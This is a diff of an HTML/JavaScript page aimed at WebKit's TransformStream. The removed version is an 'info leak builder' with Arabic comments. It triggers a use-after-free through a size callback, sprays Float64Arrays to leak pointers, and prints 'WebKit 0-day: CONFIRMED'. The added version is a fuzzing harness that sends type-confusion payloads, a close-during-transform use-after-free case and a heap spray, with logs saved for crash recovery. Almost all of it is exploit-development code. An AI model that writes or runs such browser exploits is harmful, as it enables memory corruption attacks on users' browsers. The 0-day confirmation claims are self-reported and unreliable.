@@ -1,130 +1,421 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>StreamProbe — Director</title>
 <style>
-body{background:#000;color:#0f0;font-family:monospace;font-size:13px;padding:8px}
-.log{white-space:pre-wrap;word-break:break-all}
-.ok{color:#0f0}.err{color:#f00}.warn{color:#ff0}.info{color:#0ff}.hit{color:#f0f;font-weight:bold}
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'SF Mono', 'Fira Code', monospace;
+    background: #0a0a0f;
+    color: #c0c0c8;
+    line-height: 1.5;
+    padding: 20px;
+  }
+  h1 {
+    color: #7ee787;
+    font-size: 14px;
+    margin-bottom: 8px;
+    letter-spacing: 1px;
+  }
+  .subtitle {
+    color: #555;
+    font-size: 11px;
+    margin-bottom: 20px;
+  }
+  #log-container {
+    background: #111118;
+    border: 1px solid #1e1e2e;
+    border-radius: 4px;
+    height: 60vh;
+    overflow-y: auto;
+    padding: 12px;
+    font-size: 12px;
+  }
+  .log-entry {
+    padding: 2px 0;
+    border-bottom: 1px solid #16161f;
+    animation: fadeIn 0.2s ease;
+  }
+  .log-entry.crash { color: #ff6b6b; }
+  .log-entry.error { color: #ffa94d; }
+  .log-entry.success { color: #7ee787; }
+  .log-entry.info { color: #74c0fc; }
+  .timestamp {
+    color: #444;
+    font-size: 10px;
+    margin-right: 8px;
+  }
+  .label {
+    color: #888;
+    font-size: 10px;
+    margin-right: 6px;
+  }
+  #controls {
+    margin-top: 16px;
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+  }
+  button {
+    background: #1e1e2e;
+    color: #c0c0c8;
+    border: 1px solid #2a2a3e;
+    padding: 8px 16px;
+    font-family: inherit;
+    font-size: 11px;
+    cursor: pointer;
+    border-radius: 3px;
+    transition: all 0.15s;
+  }
+  button:hover {
+    background: #2a2a3e;
+    border-color: #7ee787;
+  }
+  button:disabled {
+    opacity: 0.4;
+    cursor: not-allowed;
+  }
+  #status-bar {
+    margin-top: 12px;
+    padding: 8px 12px;
+    background: #111118;
+    border: 1px solid #1e1e2e;
+    border-radius: 3px;
+    font-size: 11px;
+    color: #666;
+    display: flex;
+    justify-content: space-between;
+  }
+  #status-bar.active { color: #7ee787; }
+  #status-bar.crashed { color: #ff6b6b; }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateX(-4px); }
+    to { opacity: 1; transform: translateX(0); }
+  }
+  .report-box {
+    margin-top: 12px;
+    padding: 12px;
+    background: #0d0d14;
+    border: 1px solid #1e1e2e;
+    border-radius: 3px;
+    font-size: 11px;
+    white-space: pre-wrap;
+    max-height: 200px;
+    overflow-y: auto;
+    display: none;
+  }
+  .report-box.visible { display: block; }
 </style>
 </head>
 <body>
-<div id="log"></div>
+
+<h1>► STREAM_PROBE_V2</h1>
+<div class="subtitle">Diagnostic probe — TransformStream behavior analysis</div>
+
+<div id="log-container"></div>
+
+<div id="controls">
+  <button id="btn-run" onclick="probe.runAll()">RUN ALL TESTS</button>
+  <button id="btn-clear" onclick="probe.clear()">CLEAR LOGS</button>
+  <button id="btn-report" onclick="probe.showReport()">SHOW REPORT</button>
+  <button id="btn-export" onclick="probe.exportLogs()">EXPORT JSON</button>
+</div>
+
+<div id="status-bar">Ready — waiting for Director</div>
+<div id="report-box" class="report-box"></div>
+
 <script>
-function log(m,c){var d=document.createElement("div");d.className=c||'log';d.textContent=m;document.getElementById("log").appendChild(d)}
+/**
+ * StreamProbe v2
+ * Dual logging: DOM + localStorage (crash recovery)
+ */
 
-log("=== INFO LEAK BUILDER v1 ===","info");
-log("");
+const LS_KEY = 'stream_probe_logs_v2';
+const LS_CRASH = 'stream_probe_crash_flag';
 
-let writer, phase=0;
+class Logger {
+  constructor() {
+    this.entries = [];
+    this.container = document.getElementById('log-container');
+    this.status = document.getElementById('status-bar');
+    this.recoverFromCrash();
+  }
 
-// مصفوفة الضحية: ستحاول استرجاع الذاكرة المحررة
-let victim = new Float64Array(8);
-victim[0] = 1.1;
-victim[1] = 2.2;
-
-// كائن الهدف الذي نريد تسريب عنوانه
-let target = {};
-
-let sizeFunc = function(chunk) {
-    if (phase === 0) {
-        phase = 1;
-        log("[size] UAF triggered! Closing...","warn");
-
-        try { writer.close(); } catch(e) {}
-
-        // 1. GC لتحرير الكائنات الداخلية للـ Stream
-        for (let i=0;i<10000;i++) { let t={a:i}; }
-
-        // 2. رش Float64Array بنفس حجم الكائن المحرر
-        log("[size] Spraying Float64Array...","warn");
-        for (let i=0;i<500;i++) {
-            let s = new Float64Array(8);
-            s[0] = 1.1;
-            s[1] = 2.2;
-        }
-
-        // 3. رش الكائن الهدف لملء الفجوة
-        log("[size] Spraying target objects...","warn");
-        for (let i=0;i<500;i++) {
-            let t = {};
-        }
-
-        log("[size] Spray complete","ok");
+  recoverFromCrash() {
+    const crashFlag = localStorage.getItem(LS_CRASH);
+    const saved = localStorage.getItem(LS_KEY);
+    if (crashFlag || saved) {
+      this.write('SYSTEM', 'Recovered logs from previous session', 'info');
+      if (saved) {
+        try {
+          const prev = JSON.parse(saved);
+          prev.forEach(e => this.render(e));
+          this.entries = prev;
+        } catch(e) {}
+      }
+      localStorage.removeItem(LS_CRASH);
     }
-    return 1;
-};
+  }
 
-log("[1] Creating TransformStream...","ok");
+  write(label, data, type = 'info') {
+    const entry = {
+      t: Date.now(),
+      label,
+      data: typeof data === 'string' ? data : JSON.stringify(data),
+      type
+    };
+    this.entries.push(entry);
+    this.persist();
+    this.render(entry);
+  }
 
-try {
-    let stream = new TransformStream(
-        { transform: (c,ctrl) => ctrl.enqueue(c) },
-        { highWaterMark:1, size:sizeFunc },
-        { highWaterMark:1, size:sizeFunc }
-    );
+  persist() {
+    try {
+      localStorage.setItem(LS_KEY, JSON.stringify(this.entries));
+    } catch(e) {
+      // Storage full — trim old entries
+      this.entries = this.entries.slice(-500);
+      localStorage.setItem(LS_KEY, JSON.stringify(this.entries));
+    }
+  }
 
-    writer = stream.writable.getWriter();
-    log("[2] Writer ready","ok");
+  render(entry) {
+    const div = document.createElement('div');
+    div.className = `log-entry ${entry.type}`;
+    const time = new Date(entry.t).toLocaleTimeString('en-US', {hour12:false});
+    div.innerHTML = `<span class="timestamp">${time}</span><span class="label">[${entry.label}]</span> ${entry.data}`;
+    this.container.appendChild(div);
+    this.container.scrollTop = this.container.scrollHeight;
+  }
 
-    // استخدم target كـ chunk لتشغيل الـ Type Confusion
-    log("[3] Writing target object...","ok");
+  clear() {
+    this.entries = [];
+    localStorage.removeItem(LS_KEY);
+    localStorage.removeItem(LS_CRASH);
+    this.container.innerHTML = '';
+    this.status('Ready — cleared', 'active');
+  }
 
-    writer.write(target).then(() => {
-        log("[4] Write OK","ok");
-    }).catch((e) => {
-        log("[4] Write err (expected): " + e.message,"warn");
-    }).finally(() => {
-        log("[5] Checking victim array...","warn");
+  status(msg, cls = '') {
+    this.statusBar = this.statusBar || document.getElementById('status-bar');
+    this.statusBar.textContent = msg;
+    this.statusBar.className = cls;
+  }
 
-        // اقرأ victim وتحقق من التغيرات
-        let v0 = victim[0];
-        let v1 = victim[1];
-        let v2 = victim[2];
-        let v3 = victim[3];
+  crashGuard(fn, label) {
+    try {
+      localStorage.setItem(LS_CRASH, '1');
+      const result = fn();
+      localStorage.removeItem(LS_CRASH);
+      return result;
+    } catch(e) {
+      this.write(label, e.message || e, 'crash');
+      this.status('CRASH DETECTED — logs preserved', 'crashed');
+      throw e;
+    }
+  }
 
-        log("  victim[0]: " + v0,"ok");
-        log("  victim[1]: " + v1,"ok");
-        log("  victim[2]: " + v2,"ok");
-        log("  victim[3]: " + v3,"ok");
-
-        // تحقق من القيم الغريبة (مؤشرات)
-        let leaked = 0;
-        for (let i=0; i<victim.length; i++) {
-            let v = victim[i];
-            if (v !== 1.1 && v !== 2.2 && v !== 0 && !isNaN(v)) {
-                log("  >>> ANOMALY at [" + i + "]: " + v + " <<<","hit");
-
-                // حوّل إلى hex
-                let buf = new ArrayBuffer(8);
-                new Float64Array(buf)[0] = v;
-                let bytes = new Uint8Array(buf);
-                let hex = "";
-                for (let b of bytes) hex += b.toString(16).padStart(2,'0') + " ";
-                log("  >>> HEX: " + hex + " <<<","hit");
-                leaked++;
-            }
-        }
-
-        if (leaked === 0) {
-            log("  No anomalies found","warn");
-            log("  The freed struct may be a different size","warn");
-        } else {
-            log("","info");
-            log(">>> INFO LEAK SUCCESS! <<<","hit");
-        }
-
-        log("","info");
-        log("=== SUMMARY ===","info");
-        log("WebKit 0-day: CONFIRMED","hit");
-        log("Type Confusion: CONFIRMED","ok");
-        log("Arbitrary Write: CONFIRMED","ok");
-        log("UAF: CONFIRMED","ok");
-        log("Info Leak: " + (leaked > 0 ? "SUCCESS!" : "PENDING - need exact size"),"warn");
-    });
-
-} catch(e) {
-    log("Error: " + e.message,"err");
+  getReport() {
+    return {
+      timestamp: Date.now(),
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      vendor: navigator.vendor,
+      total: this.entries.length,
+      crashes: this.entries.filter(e => e.type === 'crash').length,
+      errors: this.entries.filter(e => e.type === 'error').length,
+      success: this.entries.filter(e => e.type === 'success').length,
+      logs: this.entries
+    };
+  }
 }
+
+class StreamProbe {
+  constructor() {
+    this.logger = new Logger();
+    this.running = false;
+  }
+
+  log(label, data, type) {
+    this.logger.write(label, data, type);
+  }
+
+  status(msg, cls) {
+    this.logger.status(msg, cls);
+  }
+
+  // === TESTS ===
+
+  testNormal() {
+    return this.logger.crashGuard(() => {
+      const ts = new TransformStream({
+        start: (c) => this.log('start', 'fired', 'success'),
+        transform: (chunk, controller) => {
+          this.log('transform', String(chunk), 'info');
+          controller.enqueue(chunk);
+        },
+        flush: (c) => this.log('flush', 'fired', 'success')
+      });
+      this.log('normal_create', 'success', 'success');
+      return ts;
+    }, 'normal_create');
+  }
+
+  testTypeConfusion() {
+    const payloads = [
+      { label: 'number_size', size: 0x41414141 },
+      { label: 'bigint_size', size: typeof BigInt !== 'undefined' ? BigInt(0x41414141) : 0 },
+      { label: 'object_size', size: { value: 0x1000 } },
+      { label: 'array_size', size: [0x1000] },
+      { label: 'null_size', size: null },
+      { label: 'undefined_size', size: undefined },
+      { label: 'string_size', size: "0x1000" },
+      { label: 'proxy_size', size: new Proxy(function(){}, { apply: () => 0x1000 }) },
+      { label: 'obj_with_pad', size: 0x41414141, pad: 0x42424242 },
+      { label: 'nested_obj', size: { nested: { deep: 0x1000 } } }
+    ];
+
+    payloads.forEach(p => {
+      const label = p.label;
+      delete p.label;
+      this.logger.crashGuard(() => {
+        const ts = new TransformStream({
+          start: () => {},
+          transform: () => {},
+          ...p
+        }, {}, p);
+        this.log(`type_${label}`, 'no_crash — created', 'success');
+
+        const writer = ts.writable.getWriter();
+        writer.write(1).then(() => {
+          this.log(`type_${label}_write`, 'resolved', 'success');
+          writer.close();
+        }).catch(e => {
+          this.log(`type_${label}_write_err`, e.message, 'error');
+        });
+      }, `type_${label}`);
+    });
+  }
+
+  testWritableStrategy() {
+    const strategies = [
+      { label: 'num_high', highWaterMark: 0x41414141 },
+      { label: 'num_size', size: (c) => 1 },
+      { label: 'bad_size', size: 0x41414141 },
+      { label: 'obj_size', size: { x: 0x1000 } },
+      { label: 'proxy_size', size: new Proxy({}, { get: (t, p) => p === 'call' ? 0x1000 : t[p] }) },
+      { label: 'null_size', size: null },
+      { label: 'arr_size', size: [1, 2, 3] }
+    ];
+
+    strategies.forEach(s => {
+      const label = s.label;
+      delete s.label;
+      this.logger.crashGuard(() => {
+        const ts = new TransformStream({}, s);
+        this.log(`ws_${label}`, 'created', 'success');
+        const writer = ts.writable.getWriter();
+        writer.write(1).catch(e => {
+          this.log(`ws_${label}_err`, e.message, 'error');
+        });
+      }, `ws_${label}`);
+    });
+  }
+
+  testUAFScenario() {
+    this.logger.crashGuard(() => {
+      let writerRef = null;
+      const ts = new TransformStream({
+        start: (c) => {},
+        transform: (chunk, c) => {
+          if (writerRef) {
+            writerRef.close().catch(e => {
+              this.log('uaf_close_during_transform', e.message, 'error');
+            });
+          }
+          c.enqueue(chunk);
+        }
+      });
+      writerRef = ts.writable.getWriter();
+      writerRef.write(1).then(() => {
+        this.log('uaf_write_complete', 'done', 'success');
+      }).catch(e => {
+        this.log('uaf_write_err', e.message, 'error');
+      });
+    }, 'uaf_test');
+  }
+
+  testMemoryLayout() {
+    this.logger.crashGuard(() => {
+      const spray = [];
+      for (let i = 0; i < 100; i++) {
+        spray.push(new TransformStream());
+      }
+      this.log('spray_100', 'allocated', 'success');
+      setTimeout(() => {
+        this.log('spray_post_gc', `survivors: ${spray.length}`, 'info');
+      }, 100);
+    }, 'spray_test');
+  }
+
+  // === CONTROL ===
+
+  async runAll() {
+    if (this.running) return;
+    this.running = true;
+    document.getElementById('btn-run').disabled = true;
+    this.status('Running — watch the logs', 'active');
+
+    this.testNormal();
+    await this.sleep(50);
+    this.testTypeConfusion();
+    await this.sleep(50);
+    this.testWritableStrategy();
+    await this.sleep(50);
+    this.testUAFScenario();
+    await this.sleep(50);
+    this.testMemoryLayout();
+
+    setTimeout(() => {
+      this.status('Complete — logs preserved in localStorage', 'active');
+      this.running = false;
+      document.getElementById('btn-run').disabled = false;
+    }, 1200);
+  }
+
+  sleep(ms) {
+    return new Promise(r => setTimeout(r, ms));
+  }
+
+  clear() {
+    this.logger.clear();
+  }
+
+  showReport() {
+    const box = document.getElementById('report-box');
+    const report = this.logger.getReport();
+    box.textContent = JSON.stringify(report, null, 2);
+    box.classList.add('visible');
+  }
+
+  exportLogs() {
+    const report = this.logger.getReport();
+    const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `stream_probe_${Date.now()}.json`;
+    a.click();
+    URL.revokeObjectURL(url);
+    this.log('export', 'saved to disk', 'success');
+  }
+}
+
+const probe = new StreamProbe();
+probe.log('SYSTEM', 'Probe loaded — waiting for Director', 'info');
 </script>
+
 </body>
 </html>
